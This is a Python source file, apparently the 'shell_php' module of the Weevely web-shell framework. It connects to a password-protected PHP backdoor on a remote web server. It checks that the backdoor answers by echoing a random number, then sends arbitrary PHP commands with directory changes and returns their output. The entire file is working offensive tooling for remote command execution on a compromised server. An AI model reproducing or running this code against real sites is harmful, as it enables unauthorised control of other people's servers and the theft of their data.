from core.module import Module
from core import messages
from core.channels.channels import get_channel
from core.vectors import Vector
import logging
import random


class Php(Module):

    """Execute PHP commands.

    Usage:
      shell_php <command>

    """

    def initialize(self):

        self._register_infos(
            {
                'name': 'PHP Shell',
                'description': __doc__,
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self._register_arguments(
            # Declare mandatory commands
            arguments=[
                'command'
            ],
            # Declare additional options
            options={
                'prefix_string': '',
                'post_data': '',
                'postfix_string': '',
            })

        self.channel = get_channel(
            self.session['url'],
            self.session['password'])

    def check(self, args={}):
        """ Check if remote PHP interpreter works """

        enabled = True
        rand = str(random.randint(11111, 99999))
        if rand != self.channel.send('echo(%s);' % rand):
            enabled = False

        logging.debug('shell_php check: %s' % enabled)

        return enabled

    def run(self, args):
        """ Run module """

        cwd = self._get_module_result('file_cd', 'cwd', default='.')

        # Compose command with pre_command and post_command option
        command = Vector(
            "chdir('${cwd}');${args['prefix_string']}${args['command']}${args['postfix_string']}"
            ).format(
            args=args,
            cwd=cwd)

        logging.debug(command)

        # Send command
        response = self.channel.send(command)

        # Strip last newline if present
        return response[
            :-
            1] if (
            response and response.endswith('\n')) else response
